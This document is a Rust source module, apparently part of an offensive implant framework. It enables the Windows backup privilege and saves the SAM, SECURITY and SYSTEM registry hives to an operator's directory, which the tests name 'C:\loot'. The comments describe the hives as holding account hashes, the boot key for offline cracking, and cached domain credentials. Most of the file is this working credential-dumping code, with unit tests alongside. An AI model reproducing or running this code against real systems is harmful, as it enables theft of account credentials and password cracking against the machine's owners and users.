//! The account-hive edge (the module's whole platform surface): the
//! SAM, SYSTEM, and SECURITY hives -- the registry's own on-disk
//! account stores -- saved through advapi32's backup path directly,
//! so the module owes the loader no dependency for six functions.
//! Everything that must hold for a test (the hive table, the row
//! renderings, the error table) is a plain function this host runs
//! anywhere; only the calls themselves sit behind `cfg(windows)`, and
//! the Windows crosses the CI lane builds prove they compile.
//!
//! Two platform facts shape the verb's honesty. Saving another
//! process's hive needs the backup privilege, and the privilege is
//! the administrator's to hold -- an unelevated implant asks, the
//! token answers not-assigned, and the refusal names elevation rather
//! than pretending the save ran. And a saved hive is an on-disk file
//! carrying account material: it sits in the task-named directory
//! until the operator pulls and deletes it, and the module's answers
//! say where every dump landed.

/// The three hives the verb carries, as the registry names them and
/// as the dumps file themselves: SAM (the local account hashes),
/// SYSTEM (the boot key the offline cracking needs), and SECURITY
/// (the cached domain credentials).
#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) struct Hive {
    /// The subkey name under HKEY_LOCAL_MACHINE that `RegSaveKeyW`
    /// takes.
    pub key: &'static str,
    /// The file name the dump lands as, beside the operator's
    /// directory.
    pub file: &'static str,
}

#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) const HIVES: [Hive; 3] = [
    Hive {
        key: "SAM",
        file: "sam.hiv",
    },
    Hive {
        key: "SECURITY",
        file: "security.hiv",
    },
    Hive {
        key: "SYSTEM",
        file: "system.hiv",
    },
];

/// The full path one hive's dump lands at.
#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) fn dump_path(directory: &str, hive: &Hive) -> String {
    format!(r"{directory}\{}", hive.file)
}

/// The row a listed hive renders: where the registry keeps it, in the
/// system directory's real terms, and whether the save would find it.
#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) fn status_row(hive: &Hive, system_directory: &str, present: bool) -> String {
    let source = format!(r"{system_directory}\config\{}", hive.key);
    if present {
        format!("{}: {source} (save finds it)", hive.key)
    } else {
        format!("{}: {source} (absent -- the save would refuse)", hive.key)
    }
}

/// The Win32 error codes the actions can meet, as the messages the
/// operator reads. A code outside the table stands as its number --
/// never a guess at what the site's registry meant by it.
#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) fn status_message(status: i32) -> String {
    match status {
        2 => "the file does not exist".to_string(),
        5 => "access denied (hive saves need an elevated implant)".to_string(),
        1314 => {
            "a required privilege is not held (hive saves need an elevated implant)".to_string()
        }
        1300 => "the backup privilege is not assigned to this token (hive saves need an \
             elevated implant)"
            .to_string(),
        183 => "the dump file already exists".to_string(),
        other => format!("hive error {other}"),
    }
}

// ---- the Windows calls ----

#[cfg(windows)]
mod win {
    use std::os::raw::c_void;

    use super::{dump_path, status_message, HIVES};

    type Hkey = isize;
    type Lstatus = i32;
    type Handle = *mut c_void;

    const HKEY_LOCAL_MACHINE: Hkey = 0x8000_0002usize as isize;

    const TOKEN_QUERY: u32 = 0x0008;
    const TOKEN_ADJUST_PRIVILEGES: u32 = 0x0020;
    const SE_PRIVILEGE_ENABLED: u32 = 0x0002;
    const KEY_READ: u32 = 0x0002_0019;
    const ERROR_NOT_ALL_ASSIGNED: i32 = 1300;
    const INVALID_FILE_ATTRIBUTES: u32 = 0xFFFF_FFFF;

    /// The API's own record, `#[repr(C)]` against its documented
    /// layout: one privilege, the backup one, enabled.
    #[repr(C)]
    struct TokenPrivileges {
        privilege_count: u32,
        privilege: LuidAndAttributes,
    }

    #[repr(C)]
    #[allow(dead_code)]
    struct LuidAndAttributes {
        luid: i64,
        attributes: u32,
    }

    #[link(name = "advapi32")]
    extern "system" {
        fn OpenProcessToken(process: Handle, desired: u32, token: *mut Handle) -> i32;
        fn LookupPrivilegeValueW(system: *const u16, name: *const u16, luid: *mut i64) -> i32;
        fn AdjustTokenPrivileges(
            token: Handle,
            disable_all: i32,
            new_state: *const TokenPrivileges,
            buffer_length: u32,
            previous: *mut TokenPrivileges,
            return_length: *mut u32,
        ) -> i32;
        fn RegOpenKeyExW(
            hkey: Hkey,
            subkey: *const u16,
            options: u32,
            desired: u32,
            result: *mut Hkey,
        ) -> Lstatus;
        fn RegSaveKeyW(hkey: Hkey, file: *const u16, security: *const c_void) -> Lstatus;
        fn RegCloseKey(hkey: Hkey) -> Lstatus;
    }

    #[link(name = "kernel32")]
    extern "system" {
        fn GetCurrentProcess() -> Handle;
        fn GetFileAttributesW(path: *const u16) -> u32;
        fn DeleteFileW(path: *const u16) -> i32;
        fn GetSystemDirectoryW(buffer: *mut u16, size: u32) -> u32;
        fn GetLastError() -> u32;
    }

    /// A NUL-terminated UTF-16 string, the encoding every `*W` entry
    /// point takes.
    fn wide(text: &str) -> Vec<u16> {
        text.encode_utf16().chain(std::iter::once(0)).collect()
    }

    /// Whether a path names something that exists.
    pub(crate) fn file_exists(path: &str) -> bool {
        unsafe { GetFileAttributesW(wide(path).as_ptr()) != INVALID_FILE_ATTRIBUTES }
    }

    /// The system directory's real path, where the source hives live.
    pub(crate) fn system_directory() -> String {
        unsafe {
            let mut buffer = vec![0u16; 1024];
            let length = GetSystemDirectoryW(buffer.as_mut_ptr(), buffer.len() as u32);
            if length == 0 || length as usize > buffer.len() {
                // The call's own contract: the real length when the
                // buffer is short. The module's uses are display and
                // existence checks; the conventional path answers.
                return r"C:\Windows\System32".to_string();
            }
            String::from_utf16_lossy(&buffer[..length as usize])
        }
    }

    /// Takes the backup privilege for this process, answering whether
    /// the token actually holds it: `AdjustTokenPrivileges` reports
    /// success while leaving the privilege unassigned when the token
    // never had it, and only the error code tells the two apart.
    pub(crate) fn backup_privilege() -> Result<(), i32> {
        unsafe {
            let mut token: Handle = std::ptr::null_mut();
            if OpenProcessToken(
                GetCurrentProcess(),
                TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,
                &mut token,
            ) == 0
            {
                return Err(5);
            }
            let name = wide("SeBackupPrivilege");
            let mut luid: i64 = 0;
            if LookupPrivilegeValueW(std::ptr::null(), name.as_ptr(), &mut luid) == 0 {
                return Err(5);
            }
            let state = TokenPrivileges {
                privilege_count: 1,
                privilege: LuidAndAttributes {
                    luid,
                    attributes: SE_PRIVILEGE_ENABLED,
                },
            };
            let adjusted = AdjustTokenPrivileges(
                token,
                0,
                &state,
                0,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
            );
            let assigned = GetLastError() as i32;
            (adjusted != 0 && assigned != ERROR_NOT_ALL_ASSIGNED)
                .then_some(())
                .ok_or(if assigned == ERROR_NOT_ALL_ASSIGNED {
                    assigned
                } else {
                    5
                })
        }
    }

    /// Saves every hive into the task-named directory, in the table's
    /// order, one row per dump: the hive key opened (the backup
    /// privilege in hand is what lets SAM and SECURITY answer), then
    /// the tree saved to the target file. A dump file already in the
    /// directory is the module's own prior work -- the save deletes it
    /// and writes fresh, so a rerun is a rerun.
    pub(crate) fn save_all(directory: &str) -> Vec<String> {
        let mut rows = Vec::new();
        for hive in &HIVES {
            let target = dump_path(directory, hive);
            if file_exists(&target) {
                unsafe { DeleteFileW(wide(&target).as_ptr()) };
            }
            let subkey = wide(hive.key);
            let mut key: Hkey = 0;
            let mut status = unsafe {
                RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.as_ptr(), 0, KEY_READ, &mut key)
            };
            if status == 0 {
                let file = wide(&target);
                status = unsafe { RegSaveKeyW(key, file.as_ptr(), std::ptr::null()) };
                unsafe { RegCloseKey(key) };
            }
            rows.push(match status {
                0 => format!("saved {} -> {target}", hive.key),
                code => format!("collect.hives: {}: {}", hive.key, status_message(code)),
            });
        }
        rows
    }
}

#[cfg(windows)]
pub(crate) use win::{backup_privilege, file_exists, save_all, system_directory};

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_table_names_the_three_account_hives() {
        assert_eq!(HIVES.len(), 3);
        assert_eq!(HIVES[0].key, "SAM");
        assert_eq!(HIVES[1].key, "SECURITY");
        assert_eq!(HIVES[2].key, "SYSTEM");
    }

    #[test]
    fn the_dumps_land_in_the_named_directory() {
        assert_eq!(dump_path(r"C:\loot", &HIVES[0]), r"C:\loot\sam.hiv");
        assert_eq!(dump_path(r"C:\loot", &HIVES[2]), r"C:\loot\system.hiv");
    }

    #[test]
    fn the_status_rows_name_the_source_and_its_state() {
        assert!(
            status_row(&HIVES[0], r"C:\Windows\System32", true)
                .contains(r"C:\Windows\System32\config\SAM"),
            "{}",
            status_row(&HIVES[0], r"C:\Windows\System32", true)
        );
        assert!(
            status_row(&HIVES[1], r"C:\Windows\System32", false).contains("absent"),
            "{}",
            status_row(&HIVES[1], r"C:\Windows\System32", false)
        );
    }

    #[test]
    fn the_status_table_names_the_codes_operators_meet() {
        assert!(
            status_message(5).contains("elevated"),
            "{}",
            status_message(5)
        );
        assert!(
            status_message(1300).contains("elevated"),
            "{}",
            status_message(1300)
        );
        assert!(
            status_message(1314).contains("elevated"),
            "{}",
            status_message(1314)
        );
        assert_eq!(status_message(183), "the dump file already exists");
        // An untabled code keeps its number -- never a guessed cause.
        assert_eq!(status_message(1010), "hive error 1010");
    }
}
